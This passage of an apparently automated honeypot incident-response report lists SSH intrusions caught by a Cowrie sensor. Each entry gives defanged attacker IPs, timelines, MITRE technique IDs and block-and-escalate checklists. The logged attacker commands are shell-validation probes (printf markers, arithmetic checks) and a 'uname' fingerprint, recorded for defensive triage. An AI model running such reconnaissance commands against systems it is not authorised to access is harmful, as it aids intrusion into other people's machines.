- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1994dae9e11

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:26 |
| **Last Seen** | 2026-11-22 01:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eea2560790470b330212e69b0b68acbf_small_control'"'"' '"'"'check_eea2560790470b330212e69b0b68acbf'"'"'', printf '\n%s|%s\n' 'check_eea2560790470b330212e69b0b68acbf_small_control' 'check_eea2560790470b330212e69b0b68acbf', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eea2560790470b330212e69b0b68acbf_small_math'"'"' "$((274*222+78))"', (274*222+78, printf '\n%s|%s\n' 'check_eea2560790470b330212e69b0b68acbf_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:26:49` | `cowrie.session.connect` |
| `2026-11-22 01:26:49` | `cowrie.client.version` |
| `2026-11-22 01:26:49` | `cowrie.client.kex` |
| `2026-11-22 01:26:52` | `cowrie.login.success` |
| `2026-11-22 01:26:54` | `cowrie.client.size` |
| `2026-11-22 01:26:55` | `cowrie.session.params` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| `2026-11-22 01:26:56` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b385cf521463

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:28 |
| **Last Seen** | 2026-11-22 01:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce4ebd3e68e670b29c2a973044b7d889_small_control'"'"' '"'"'check_ce4ebd3e68e670b29c2a973044b7d889'"'"'', printf '\n%s|%s\n' 'check_ce4ebd3e68e670b29c2a973044b7d889_small_control' 'check_ce4ebd3e68e670b29c2a973044b7d889', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ce4ebd3e68e670b29c2a973044b7d889_small_math'"'"' "$((971*879+47))"', (971*879+47, printf '\n%s|%s\n' 'check_ce4ebd3e68e670b29c2a973044b7d889_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:28:48` | `cowrie.session.connect` |
| `2026-11-22 01:28:49` | `cowrie.client.version` |
| `2026-11-22 01:28:49` | `cowrie.client.kex` |
| `2026-11-22 01:28:51` | `cowrie.login.success` |
| `2026-11-22 01:28:53` | `cowrie.client.size` |
| `2026-11-22 01:28:54` | `cowrie.session.params` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| `2026-11-22 01:28:55` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5c6d5032e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:30 |
| **Last Seen** | 2026-11-22 01:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b87ec379b010925108fe2878722e7f34_small_control'"'"' '"'"'check_b87ec379b010925108fe2878722e7f34'"'"'', printf '\n%s|%s\n' 'check_b87ec379b010925108fe2878722e7f34_small_control' 'check_b87ec379b010925108fe2878722e7f34', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b87ec379b010925108fe2878722e7f34_small_math'"'"' "$((372*492+89))"', (372*492+89, printf '\n%s|%s\n' 'check_b87ec379b010925108fe2878722e7f34_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:30:47` | `cowrie.session.connect` |
| `2026-11-22 01:30:47` | `cowrie.client.version` |
| `2026-11-22 01:30:47` | `cowrie.client.kex` |
| `2026-11-22 01:30:50` | `cowrie.login.success` |
| `2026-11-22 01:30:52` | `cowrie.client.size` |
| `2026-11-22 01:30:53` | `cowrie.session.params` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| `2026-11-22 01:30:54` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8f101aa4c9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:32 |
| **Last Seen** | 2026-11-22 01:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ab9afc47a482c9bc597dabbfbfa61443_small_control'"'"' '"'"'check_ab9afc47a482c9bc597dabbfbfa61443'"'"'', printf '\n%s|%s\n' 'check_ab9afc47a482c9bc597dabbfbfa61443_small_control' 'check_ab9afc47a482c9bc597dabbfbfa61443', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ab9afc47a482c9bc597dabbfbfa61443_small_math'"'"' "$((63*169+87))"', (63*169+87, printf '\n%s|%s\n' 'check_ab9afc47a482c9bc597dabbfbfa61443_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:32:47` | `cowrie.session.connect` |
| `2026-11-22 01:32:48` | `cowrie.client.version` |
| `2026-11-22 01:32:48` | `cowrie.client.kex` |
| `2026-11-22 01:32:52` | `cowrie.login.success` |
| `2026-11-22 01:32:54` | `cowrie.client.size` |
| `2026-11-22 01:32:55` | `cowrie.session.params` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| `2026-11-22 01:32:56` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526f9945d621

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:34 |
| **Last Seen** | 2026-11-22 01:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_75305c11a95c1dcec9183452fc49c203_small_control'"'"' '"'"'check_75305c11a95c1dcec9183452fc49c203'"'"'', printf '\n%s|%s\n' 'check_75305c11a95c1dcec9183452fc49c203_small_control' 'check_75305c11a95c1dcec9183452fc49c203', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_75305c11a95c1dcec9183452fc49c203_small_math'"'"' "$((91*777+28))"', (91*777+28, printf '\n%s|%s\n' 'check_75305c11a95c1dcec9183452fc49c203_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:34:47` | `cowrie.session.connect` |
| `2026-11-22 01:34:48` | `cowrie.client.version` |
| `2026-11-22 01:34:48` | `cowrie.client.kex` |
| `2026-11-22 01:34:51` | `cowrie.login.success` |
| `2026-11-22 01:34:53` | `cowrie.client.size` |
| `2026-11-22 01:34:54` | `cowrie.session.params` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| `2026-11-22 01:34:55` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-340a13820f38

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:36 |
| **Last Seen** | 2026-11-22 01:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c5ac95ee414dd2340c99ff598ef9f031_small_control'"'"' '"'"'check_c5ac95ee414dd2340c99ff598ef9f031'"'"'', printf '\n%s|%s\n' 'check_c5ac95ee414dd2340c99ff598ef9f031_small_control' 'check_c5ac95ee414dd2340c99ff598ef9f031', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c5ac95ee414dd2340c99ff598ef9f031_small_math'"'"' "$((755*725+68))"', (755*725+68, printf '\n%s|%s\n' 'check_c5ac95ee414dd2340c99ff598ef9f031_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:36:48` | `cowrie.session.connect` |
| `2026-11-22 01:36:51` | `cowrie.client.version` |
| `2026-11-22 01:36:51` | `cowrie.client.kex` |
| `2026-11-22 01:36:54` | `cowrie.login.success` |
| `2026-11-22 01:36:56` | `cowrie.client.size` |
| `2026-11-22 01:36:57` | `cowrie.session.params` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:57` | `cowrie.command.input` |
| `2026-11-22 01:36:58` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b4d0c0b5013

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:38 |
| **Last Seen** | 2026-11-22 01:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_478be2dae11f2b4e4ee5839e5afdb8f1_small_control'"'"' '"'"'check_478be2dae11f2b4e4ee5839e5afdb8f1'"'"'', printf '\n%s|%s\n' 'check_478be2dae11f2b4e4ee5839e5afdb8f1_small_control' 'check_478be2dae11f2b4e4ee5839e5afdb8f1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_478be2dae11f2b4e4ee5839e5afdb8f1_small_math'"'"' "$((370*597+80))"', (370*597+80, printf '\n%s|%s\n' 'check_478be2dae11f2b4e4ee5839e5afdb8f1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:38:48` | `cowrie.session.connect` |
| `2026-11-22 01:38:49` | `cowrie.client.version` |
| `2026-11-22 01:38:49` | `cowrie.client.kex` |
| `2026-11-22 01:38:52` | `cowrie.login.success` |
| `2026-11-22 01:38:54` | `cowrie.client.size` |
| `2026-11-22 01:38:55` | `cowrie.session.params` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| `2026-11-22 01:38:55` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64afbb67aef2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:40 |
| **Last Seen** | 2026-11-22 01:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bd2870a35cda8e11066d97e1680c2cfe_small_control'"'"' '"'"'check_bd2870a35cda8e11066d97e1680c2cfe'"'"'', printf '\n%s|%s\n' 'check_bd2870a35cda8e11066d97e1680c2cfe_small_control' 'check_bd2870a35cda8e11066d97e1680c2cfe', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bd2870a35cda8e11066d97e1680c2cfe_small_math'"'"' "$((569*97+22))"', (569*97+22, printf '\n%s|%s\n' 'check_bd2870a35cda8e11066d97e1680c2cfe_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:40:47` | `cowrie.session.connect` |
| `2026-11-22 01:40:48` | `cowrie.client.version` |
| `2026-11-22 01:40:48` | `cowrie.client.kex` |
| `2026-11-22 01:40:51` | `cowrie.login.success` |
| `2026-11-22 01:40:53` | `cowrie.client.size` |
| `2026-11-22 01:40:54` | `cowrie.session.params` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| `2026-11-22 01:40:55` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398dfae79735

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:42 |
| **Last Seen** | 2026-11-22 01:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f5ed6e55708b49fdb92384ffdc85c92e_small_control'"'"' '"'"'check_f5ed6e55708b49fdb92384ffdc85c92e'"'"'', printf '\n%s|%s\n' 'check_f5ed6e55708b49fdb92384ffdc85c92e_small_control' 'check_f5ed6e55708b49fdb92384ffdc85c92e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f5ed6e55708b49fdb92384ffdc85c92e_small_math'"'"' "$((147*498+5))"', (147*498+5, printf '\n%s|%s\n' 'check_f5ed6e55708b49fdb92384ffdc85c92e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:42:44` | `cowrie.session.connect` |
| `2026-11-22 01:42:45` | `cowrie.client.version` |
| `2026-11-22 01:42:45` | `cowrie.client.kex` |
| `2026-11-22 01:42:48` | `cowrie.login.success` |
| `2026-11-22 01:42:50` | `cowrie.client.size` |
| `2026-11-22 01:42:51` | `cowrie.session.params` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| `2026-11-22 01:42:52` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed328c9504b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:44 |
| **Last Seen** | 2026-11-22 01:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91363eaaa55fae1f5764ba22922ce654_small_control'"'"' '"'"'check_91363eaaa55fae1f5764ba22922ce654'"'"'', printf '\n%s|%s\n' 'check_91363eaaa55fae1f5764ba22922ce654_small_control' 'check_91363eaaa55fae1f5764ba22922ce654', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91363eaaa55fae1f5764ba22922ce654_small_math'"'"' "$((286*187+24))"', (286*187+24, printf '\n%s|%s\n' 'check_91363eaaa55fae1f5764ba22922ce654_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:44:43` | `cowrie.session.connect` |
| `2026-11-22 01:44:43` | `cowrie.client.version` |
| `2026-11-22 01:44:43` | `cowrie.client.kex` |
| `2026-11-22 01:44:46` | `cowrie.login.success` |
| `2026-11-22 01:44:49` | `cowrie.client.size` |
| `2026-11-22 01:44:50` | `cowrie.session.params` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| `2026-11-22 01:44:50` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d721c07195

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:46 |
| **Last Seen** | 2026-11-22 01:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e9479f57aaec31b5537a0023e359cd47_small_control'"'"' '"'"'check_e9479f57aaec31b5537a0023e359cd47'"'"'', printf '\n%s|%s\n' 'check_e9479f57aaec31b5537a0023e359cd47_small_control' 'check_e9479f57aaec31b5537a0023e359cd47', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e9479f57aaec31b5537a0023e359cd47_small_math'"'"' "$((897*161+65))"', (897*161+65, printf '\n%s|%s\n' 'check_e9479f57aaec31b5537a0023e359cd47_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:46:42` | `cowrie.session.connect` |
| `2026-11-22 01:46:42` | `cowrie.client.version` |
| `2026-11-22 01:46:42` | `cowrie.client.kex` |
| `2026-11-22 01:46:45` | `cowrie.login.success` |
| `2026-11-22 01:46:47` | `cowrie.client.size` |
| `2026-11-22 01:46:48` | `cowrie.session.params` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| `2026-11-22 01:46:49` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a9e679a7d1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:48 |
| **Last Seen** | 2026-11-22 01:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_acee17b3d92ba6ad0a713699914138d8_small_control'"'"' '"'"'check_acee17b3d92ba6ad0a713699914138d8'"'"'', printf '\n%s|%s\n' 'check_acee17b3d92ba6ad0a713699914138d8_small_control' 'check_acee17b3d92ba6ad0a713699914138d8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_acee17b3d92ba6ad0a713699914138d8_small_math'"'"' "$((403*122+39))"', (403*122+39, printf '\n%s|%s\n' 'check_acee17b3d92ba6ad0a713699914138d8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:48:39` | `cowrie.session.connect` |
| `2026-11-22 01:48:40` | `cowrie.client.version` |
| `2026-11-22 01:48:40` | `cowrie.client.kex` |
| `2026-11-22 01:48:42` | `cowrie.login.success` |
| `2026-11-22 01:48:44` | `cowrie.client.size` |
| `2026-11-22 01:48:45` | `cowrie.session.params` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| `2026-11-22 01:48:46` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4fed338790

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]107` |
| **First Seen** | 2026-11-22 01:49 |
| **Last Seen** | 2026-11-22 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:49:46` | `cowrie.session.connect` |
| `2026-11-22 01:49:46` | `cowrie.client.version` |
| `2026-11-22 01:49:46` | `cowrie.client.kex` |
| `2026-11-22 01:49:46` | `cowrie.login.success` |
| `2026-11-22 01:49:47` | `cowrie.session.params` |
| `2026-11-22 01:49:47` | `cowrie.command.input` |
| `2026-11-22 01:49:47` | `cowrie.log.closed` |
| `2026-11-22 01:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]107` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (33) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e7daaeb31420 | HIGH | `169.128.70[.]53` | 2026-11-22 01:49 | Y | 4 | 0 | `T1078 · T1083` |
| IR-8be8ae87fc89 | HIGH | `92.118.39[.]14` | 2026-11-22 01:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-323265758093 | HIGH | `112.197.2[.]116` | 2026-11-22 01:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ef639254b01b | HIGH | `92.118.39[.]14` | 2026-11-22 01:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-18c743d5b96d | HIGH | `92.118.39[.]14` | 2026-11-22 01:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-621fd9081543 | HIGH | `193.32.162[.]15` | 2026-11-22 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-97895d0e468a | HIGH | `92.118.39[.]14` | 2026-11-22 01:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a3b1abfdcc6c | HIGH | `92.118.39[.]14` | 2026-11-22 01:58 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-01dd61e0ea24 | HIGH | `199.165.159[.]105` | 2026-11-22 02:00 | Y | 3 | 0 | `T1078` |
| IR-0a358ebddb9d | HIGH | `92.118.39[.]14` | 2026-11-22 02:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5a80e6f4a5bd | HIGH | `92.118.39[.]14` | 2026-11-22 02:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bfe41c18ca8f | HIGH | `92.118.39[.]14` | 2026-11-22 02:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-df969ad70abf | HIGH | `92.118.39[.]14` | 2026-11-22 02:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a27864c37b76 | HIGH | `176.53.159[.]196` | 2026-11-22 02:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0d820bdf913 | HIGH | `92.118.39[.]14` | 2026-11-22 02:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
